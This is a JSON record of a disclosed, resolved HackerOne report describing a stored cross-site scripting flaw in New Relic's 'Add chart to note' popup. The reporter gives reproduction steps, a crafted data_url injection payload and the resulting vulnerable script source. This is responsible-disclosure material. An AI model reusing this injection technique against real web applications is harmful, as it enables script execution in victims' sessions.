@@ -1,0 +1,146 @@
+{
+  "id": 566400,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NjY0MDA=",
+  "url": "https://hackerone.com/reports/566400",
+  "title": "Stored XSS firing at the \"Add chart to note\" popup",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-05-04T15:44:55.603Z",
+  "submitted_at": "2019-05-04T15:44:55.603Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skavans",
+    "url": "/skavans",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-08-13T10:58:02.687Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-11T09:32:22.768Z",
+  "team_member_agreed_on_going_public_at": "2020-08-13T10:58:02.606Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey team,\n\nI have long found that a request retrieving content for `Add chart to note` popup is XSS-vulnerable.\n\nThe following `Add to note` popup\n{F484252}\nretrieves its content via the following request:\n```http\nGET /accounts/2319495/notes/new?context_url=%2Faccounts%2F2319495%2Fcustom_dashboards%2Fpages%2F11859%3Ftw%255Bdur%255D%3Dlast_7_days%26tw%255Bend%255D%3D1556964641&app_name=undefined&app_id=undefined&tw%5Bdur%5D=last_7_days&tw%5Bend%5D=1556964641&data_url=%2Fchart_data%2Fmetric_charts%2Fapp_breakdown.json%3Faccount_id%3D2319495%26agent%3D146132689%26application_id%3D146132689%26chart_type%3DStackedArea2D%26clickURL%3D%252Faccounts%252F2319495%252Fapplications%252F146132689%252Ftransactions%26current_product%3Dapm_product%26customLineWidth%3D2%26live%3Dtrue%26number_suffix%3Dms%26render_to%3Dcurrent_response_time_single_146132689%26tooltipGroup%3Dcurrent_charts%26title%3D%2526%2523x27%253B%2526quot%253Bx6nxss%2526gt%253B%2526lt%253Bimg%2Bsrc%253Dx6nxss%2526gt%253B%253A%2BAverage%2Bresponse%2Btime%252C%2Bby%2Btier%2B%2528ms%2529%26hide_legend%3Dtrue%26tw%255Bdur%255D%3Dlast_7_days%26tw%255Bend%255D%3D1556964641&chart_title=%26amp%3B%23x27%3B%26amp%3Bquot%3Bx6nxss%26amp%3Bgt%3B%26amp%3Blt%3Bimg+src%3Dx6nxss%26amp%3Bgt%3B%3A+Average+response+time%2C+by+tier+(ms) HTTP/1.1\nHost: rpm.newrelic.com\n```\nThe `data_url` parameter is then reflected at the response body in a following way:\n```html\n<script type=\"text/javascript\">\n      jQuery(document).ready(function($) {\n        var chart_options = {\"height\":\"250px\",\"fluid\":false,\"snappable\":false,\"loadingOverlay\":true,\"render\":true};\n        chart_options.dataUrl = '/chart_data/metric_charts/app_breakdown.json?account_id=2319495&agent=146132689&application_id=146132689&chart_type=StackedArea2D&clickURL=%2Faccounts%2F2319495%2Fapplications%2F146132689%2Ftransactions&current_product=apm_product&customLineWidth=2&hide_legend=true&live=true&number_suffix=ms&render_to=current_response_time_single_146132689&title=%26%23x27%3B%26quot%3Bx6nxss%26gt%3B%26lt%3Bimg+src%3Dx6nxss%26gt%3B%3A+Average+response+time%2C+by+tier+%28ms%29&tooltipGroup=current_charts&tw%5Bdur%5D=last_7_days&tw%5Bend%5D=1556964641&no_click=1&no_links=1';\n        $('#snapping_chart').highcharts(chart_options);\n      });\n    </script>\n```\n\nIf we place the single quote char into this parameter value, we can break the `chart_options.dataUrl` string containing this URL at the response and thus perform an XSS using some payload like `'-alert()-'`. So I wanted to report this as classic reflected XSS but there is a kind of protection, which checks the `X-Requested-With` request header is present, and returns the 400 response otherwise. So it was impossible to exploit this because it's impossible to send this header when user clicks the malicious link.\n\nBut during my today research I have found a way to turn this into a stored XSS via creating the specific malicious chart first. Then, when the victim tries to add this chart to a note, the XSS payload is executed. Let me describe this thoroughly.\n\nUsually, when we try to add some chart from the any part of New Relic application to a note, the `data_url` parameter for `Add to note` popup request is created using JS function, which grabs some chart parameters (like title, app_id, etc.) and then makes the URL from them. The URL making process is correct and safe so if we place the single quote inside some of these chart parameters, it will be urlencoded in resulting URL (according to HTTP specification). So if I create a chart with e.g. title `XSS'-alert()-'`, the resulting `data_url` built by JS will be like `/chart.json?title=XSS%27` and then, when this URL will be sent to provide an `Add to note` popup, it will be encoded the second time and will become like `/chart.json?title=XSS%2527`. And the resulting HTML will be safe because of this proper two-layer encoding.\n\nBut there is a place when I can manually control the chart URL – the custom dashboards. Here is how the custom dashboard chart is initialized:\n```html\n<script type='text/javascript'>\n      jQuery(function($) {\n        var loadChart = function() {\n          $('#41862').highcharts({\n            height: '400',\n            dataUrl: '/chart_data/metric_charts/app_breakdown.json?account_id=2319495&agent=146132689&application_id=146132689&chart_type=StackedArea2D&clickURL=%2Faccounts%2F2319495%2Fapplications%2F146132689%2Ftransactions&current_product=apm_product&customLineWidth=2&live=true&number_suffix=ms&render_to=current_response_time_single_146132689&tooltipGroup=current_charts&title=%26%23x27%3B%26quot%3Bx6nxss%26gt%3B%26lt%3Bimg+src%3Dx6nxss%26gt%3B%3A+Average+response+time%2C+by+tier+%28ms%29&hide_legend=true',\n            render: true,\n            fluid: true,\n            loadingOverlay: true,\n            snappable: true,\n            chart_title: \"&amp;#x27;&amp;quot;x6nxss&amp;gt;&amp;lt;img src=x6nxss&amp;gt;: Average response time, by tier (ms)\",\n            liveChart: false,\n            dataApiUrl: '',\n            zoom_url: '',\n            dataApiField: '',\n            addToDashboard: false,\n            embeddable: false\n          });\n        };\n        jQuery.rpm.highcharts.registerRender(loadChart);\n      });\n    </script>\n```\nAnd when I try to add this chart to a note, the `data_url` parameter for request will be taken from the `dataURL` parameter directly. So all that I need to perform the attack is to place the single quote inside this custom dashboard chart `dataUrl` parameter. But I also need both scripts (this initializer and the one inside the `Add to note` popup) to be valid so the final payload is tricky a little.\n\n###Steps to reproduce\n1) Sign into the app via account with role `User` or higher\n2) Navigate to the some APM app, move mouse over some chart and click `More` -> `Add to legacy custom dashboard`, enter some title and click `Add`. Intercept the request using some intercepting proxy tool (e.g. Burp Suite).\n3) At the intercept request replace the head of `mixed_dashboards_dashboard%5Bchart%5D%5Bdata_url%5D` parameter (`%2Fchart_data%2Fmetric_charts`...) with `/\\'-alert(document.domain)-\\'/..%2Fchart_data%2Fmetric_charts` and send the request. The response will contain the created custom dashboard link.\n4) Navigate to the created custom dashboard. If you inspect the page source, you will see how the pinned chart is initialized now:\n```html\n<script type='text/javascript'>\n      jQuery(function($) {\n        var loadChart = function() {\n          $('#41871').highcharts({\n            height: '400',\n            dataUrl: '/\\'-alert(document.domain)-\\'/../chart_data/metric_charts/app_breakdown.json?account_id=2319495&agent=146103643&application_id=146103643&chart_type=StackedArea2D&clickURL=%2Faccounts%2F2319495%2Fapplications%2F146103643%2Ftransactions&current_product=apm_product&customLineWidth=2&live=true&number_suffix=ms&render_to=current_response_time_single_146103643&tooltipGroup=current_charts&title=123123%3A+Average+response+time%2C+by+tier+%28ms%29&hide_legend=true',\n            render: true,\n            fluid: true,\n            loadingOverlay: true,\n            snappable: true,\n            chart_title: \"123123: Average response time, by tier (ms)\",\n            liveChart: false,\n            dataApiUrl: '',\n            zoom_url: '',\n            dataApiField: '',\n            addToDashboard: false,\n            embeddable: false\n          });\n        };\n        jQuery.rpm.highcharts.registerRender(loadChart);\n      });\n    </script>\n```\n5) Move mouse to the pinned chart and click `More` -> `Add to note`. Make sure the payload is executed inside the popup.\n{F484275}\nIf you inspect the popup source now, you will see the payload inside:\n```js\njQuery(document).ready(function($) {\n        var chart_options = {\"height\":\"250px\",\"fluid\":false,\"snappable\":false,\"loadingOverlay\":true,\"render\":true};\n        chart_options.dataUrl = '/'-alert(document.domain)-'/../chart_data/metric_charts/app_breakdown.json?account_id=2319495&agent=146103643&application_id=146103643&chart_type=StackedArea2D&clickURL=%2Faccounts%2F2319495%2Fapplications%2F146103643%2Ftransactions&current_product=apm_product&customLineWidth=2&hide_legend=true&live=true&number_suffix=ms&render_to=current_response_time_single_146103643&title=123123%3A+Average+response+time%2C+by+tier+%28ms%29&tooltipGroup=current_charts&tw%5Bdur%5D=last_7_days&tw%5Bend%5D=1556964641&no_click=1&no_links=1';\n        $('#snapping_chart').highcharts(chart_options);\n      });\n```\n\nP.S.: These steps use the custom dashboards chart `dataUrl`, as inside the #544694, but the vulnerability itself is different – lack of `data_url` parameter escaping, when the `Add to note` popup is shown.\n\n###PoC-video:\nAs the exploitation is not trivial, I have recorded the video below, which demonstrates all the process.\n{F484277}\n\n## Impact\n\nWhen a victim tries to add a chart to note, the arbitrary malicious code is executed.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 484252,
+      "file_name": "______________2019-05-04___17.26.01.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/252/e4719126be408642df7b78ec2484aff470a24e31/______________2019-05-04___17.26.01.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-05-04___17.26.01.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-05-04___17.26.01.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRSPJQEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIANREuSO5xRo5uYh9p3fj5lFZASOM0CJaqF9aRTyqP1tAiBMs6gYtXIgibXyOqYUXBJZxA%2Fdza4ke6K%2F%2F0b5E9m1RSqwBQh2EAMaDDAxMzYxOTI3NDg0OSIM8OmUCbC3Pqq1SyEDKo0F3cO4ThOa4uitsGZnpJd4WSWYKi0%2F5mL8qwHwgq3ZuZ1aNUqEK3JGtjDNNtehYQzb3K%2BVzvT15T5E0DeN3sE8NL7KIl3i0Dx5W04t%2FCwofuZVDH6Rwez2OIyLRGEiHKo%2FP%2FkbGO6J7x9mVhWTOKS2bFg4igbBGqP%2Bi2aedUT3vluiB7ukP1cc428RmdmCV%2BuhSI6mu%2Fx6zanZ8MjIY1iRcGFyRSvjl0iN9Apkcqbj2H8R4UNg8b2kqipVUPR0IhWE4Repf%2B6oHnySIQcgKlfP60eivKF7%2BDxEpCbVDsb91wMe67XzEaDtj4q3yEkaR59%2FnN0%2Fg51i8gvLHyAK2aB8UWfJhpojdnN%2FB%2BaF6aGM1Zep47eAH4cQQWhMZ2I26LKQhm7iwRj6IEHbgHd2m6nHPOKHU2uWuHo13GDorNeQWMI%2FABbIu1tC%2FBPGMydY2v4uUNIntKjUUw%2BXSGO9A9lk6BbiANo%2BTxvrgKzjhYstigi28K%2FJy2l%2B50z3nW5D8NMHVXHTF9%2FfZJj2T3gBRe9rfchTv6%2Bbpy1%2Bn8nOxmudj%2B9inUeddHC6rtgTt35Y1V%2FQuDeghaOCTLBIQIRUj2dXMLrSvM6ipTuqtOLpxyjWPKhlGteSd9sRZ2GulqFnPco4IJ18%2Fn03rD%2FZTFvntG5nnCfDUN1rKUSiHRLc%2Be2fxn1LToFrzjJFDRvOSJIM%2FpzLFcAYL8tTTyFBkIKfd049EasT8fD7XkmUkbP9SU%2Fz3oask16Cc%2FxTEDv733bE%2B2WRdqbzle4n0HY%2F8WFiXHg%2FcBG11MfaIEqM74wTZ5xO8lGQRD8qVunQROTT4innfbTfWRrrpjWEVYNiOx7p4%2BZ0qgpFMn9%2F3hcTkdABX%2BMwpcOtrgY6sgEIuPpZKWB6MctyieUs6Zf8b%2FX4IKPm%2BfhMeS2tI0il7r2OReIXdjDVkC4sQOPEZhbn%2BDfZAXOoMl6LPgx5C10nOg8D%2BTLxqQZt9rcPO7a6NY6DuIvhZo5c4RdVjEGuOfc%2FAROg4UmbOf0zkue94sBg8VslzPwR4H20rwyBYQqkWxtaGVbZKYCCbNb6IEpuSkgMadMJvwHOmUUOWS2k1Jnl6yQZixJKKroR7DQEK1J3Lebd&X-Amz-SignedHeaders=host&X-Amz-Signature=78f21e8d233d342bb390c80f25550a0b80c56dcdad074848b727547d4f30cbd7",
+      "file_size": 163225,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 484275,
+      "file_name": "______________2019-05-04___18.23.59.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/275/e9ade6d1fd8405753d959d4dd85b10eafe0db47f/______________2019-05-04___18.23.59.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-05-04___18.23.59.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-05-04___18.23.59.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRSPJQEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIANREuSO5xRo5uYh9p3fj5lFZASOM0CJaqF9aRTyqP1tAiBMs6gYtXIgibXyOqYUXBJZxA%2Fdza4ke6K%2F%2F0b5E9m1RSqwBQh2EAMaDDAxMzYxOTI3NDg0OSIM8OmUCbC3Pqq1SyEDKo0F3cO4ThOa4uitsGZnpJd4WSWYKi0%2F5mL8qwHwgq3ZuZ1aNUqEK3JGtjDNNtehYQzb3K%2BVzvT15T5E0DeN3sE8NL7KIl3i0Dx5W04t%2FCwofuZVDH6Rwez2OIyLRGEiHKo%2FP%2FkbGO6J7x9mVhWTOKS2bFg4igbBGqP%2Bi2aedUT3vluiB7ukP1cc428RmdmCV%2BuhSI6mu%2Fx6zanZ8MjIY1iRcGFyRSvjl0iN9Apkcqbj2H8R4UNg8b2kqipVUPR0IhWE4Repf%2B6oHnySIQcgKlfP60eivKF7%2BDxEpCbVDsb91wMe67XzEaDtj4q3yEkaR59%2FnN0%2Fg51i8gvLHyAK2aB8UWfJhpojdnN%2FB%2BaF6aGM1Zep47eAH4cQQWhMZ2I26LKQhm7iwRj6IEHbgHd2m6nHPOKHU2uWuHo13GDorNeQWMI%2FABbIu1tC%2FBPGMydY2v4uUNIntKjUUw%2BXSGO9A9lk6BbiANo%2BTxvrgKzjhYstigi28K%2FJy2l%2B50z3nW5D8NMHVXHTF9%2FfZJj2T3gBRe9rfchTv6%2Bbpy1%2Bn8nOxmudj%2B9inUeddHC6rtgTt35Y1V%2FQuDeghaOCTLBIQIRUj2dXMLrSvM6ipTuqtOLpxyjWPKhlGteSd9sRZ2GulqFnPco4IJ18%2Fn03rD%2FZTFvntG5nnCfDUN1rKUSiHRLc%2Be2fxn1LToFrzjJFDRvOSJIM%2FpzLFcAYL8tTTyFBkIKfd049EasT8fD7XkmUkbP9SU%2Fz3oask16Cc%2FxTEDv733bE%2B2WRdqbzle4n0HY%2F8WFiXHg%2FcBG11MfaIEqM74wTZ5xO8lGQRD8qVunQROTT4innfbTfWRrrpjWEVYNiOx7p4%2BZ0qgpFMn9%2F3hcTkdABX%2BMwpcOtrgY6sgEIuPpZKWB6MctyieUs6Zf8b%2FX4IKPm%2BfhMeS2tI0il7r2OReIXdjDVkC4sQOPEZhbn%2BDfZAXOoMl6LPgx5C10nOg8D%2BTLxqQZt9rcPO7a6NY6DuIvhZo5c4RdVjEGuOfc%2FAROg4UmbOf0zkue94sBg8VslzPwR4H20rwyBYQqkWxtaGVbZKYCCbNb6IEpuSkgMadMJvwHOmUUOWS2k1Jnl6yQZixJKKroR7DQEK1J3Lebd&X-Amz-SignedHeaders=host&X-Amz-Signature=4ef365d48d77ad8db7493d78190b8605695373318ff1f6ff1f8a67330498c881",
+      "file_size": 300737,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 484277,
+      "file_name": "nr_xss_add_to_note.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/484/277/f4226cb604ec7f36827d18364be5ecfe7ba4e9a4/nr_xss_add_to_note.mp4?response-content-disposition=attachment%3B%20filename%3D%22nr_xss_add_to_note.mp4%22%3B%20filename%2A%3DUTF-8%27%27nr_xss_add_to_note.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRSPJQEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIANREuSO5xRo5uYh9p3fj5lFZASOM0CJaqF9aRTyqP1tAiBMs6gYtXIgibXyOqYUXBJZxA%2Fdza4ke6K%2F%2F0b5E9m1RSqwBQh2EAMaDDAxMzYxOTI3NDg0OSIM8OmUCbC3Pqq1SyEDKo0F3cO4ThOa4uitsGZnpJd4WSWYKi0%2F5mL8qwHwgq3ZuZ1aNUqEK3JGtjDNNtehYQzb3K%2BVzvT15T5E0DeN3sE8NL7KIl3i0Dx5W04t%2FCwofuZVDH6Rwez2OIyLRGEiHKo%2FP%2FkbGO6J7x9mVhWTOKS2bFg4igbBGqP%2Bi2aedUT3vluiB7ukP1cc428RmdmCV%2BuhSI6mu%2Fx6zanZ8MjIY1iRcGFyRSvjl0iN9Apkcqbj2H8R4UNg8b2kqipVUPR0IhWE4Repf%2B6oHnySIQcgKlfP60eivKF7%2BDxEpCbVDsb91wMe67XzEaDtj4q3yEkaR59%2FnN0%2Fg51i8gvLHyAK2aB8UWfJhpojdnN%2FB%2BaF6aGM1Zep47eAH4cQQWhMZ2I26LKQhm7iwRj6IEHbgHd2m6nHPOKHU2uWuHo13GDorNeQWMI%2FABbIu1tC%2FBPGMydY2v4uUNIntKjUUw%2BXSGO9A9lk6BbiANo%2BTxvrgKzjhYstigi28K%2FJy2l%2B50z3nW5D8NMHVXHTF9%2FfZJj2T3gBRe9rfchTv6%2Bbpy1%2Bn8nOxmudj%2B9inUeddHC6rtgTt35Y1V%2FQuDeghaOCTLBIQIRUj2dXMLrSvM6ipTuqtOLpxyjWPKhlGteSd9sRZ2GulqFnPco4IJ18%2Fn03rD%2FZTFvntG5nnCfDUN1rKUSiHRLc%2Be2fxn1LToFrzjJFDRvOSJIM%2FpzLFcAYL8tTTyFBkIKfd049EasT8fD7XkmUkbP9SU%2Fz3oask16Cc%2FxTEDv733bE%2B2WRdqbzle4n0HY%2F8WFiXHg%2FcBG11MfaIEqM74wTZ5xO8lGQRD8qVunQROTT4innfbTfWRrrpjWEVYNiOx7p4%2BZ0qgpFMn9%2F3hcTkdABX%2BMwpcOtrgY6sgEIuPpZKWB6MctyieUs6Zf8b%2FX4IKPm%2BfhMeS2tI0il7r2OReIXdjDVkC4sQOPEZhbn%2BDfZAXOoMl6LPgx5C10nOg8D%2BTLxqQZt9rcPO7a6NY6DuIvhZo5c4RdVjEGuOfc%2FAROg4UmbOf0zkue94sBg8VslzPwR4H20rwyBYQqkWxtaGVbZKYCCbNb6IEpuSkgMadMJvwHOmUUOWS2k1Jnl6yQZixJKKroR7DQEK1J3Lebd&X-Amz-SignedHeaders=host&X-Amz-Signature=2f48cada671c1a4853f37c7da482ac1bf7aa7792558db89839817b32f61485ea",
+      "file_size": 13325540,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-10T09:32:22.813Z",
+  "allow_singular_disclosure_after": -108100193.64422266,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "wi11",
+    "ertugrul",
+    "ali",
+    "joaovitormaia",
+    "naategh",
+    "cryptographer",
+    "pkhadka",
+    "vangogh001",
+    "rajeshmoravaneni",
+    "meispi",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18678,
+    "asset_type": "URL",
+    "asset_identifier": "rpm.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
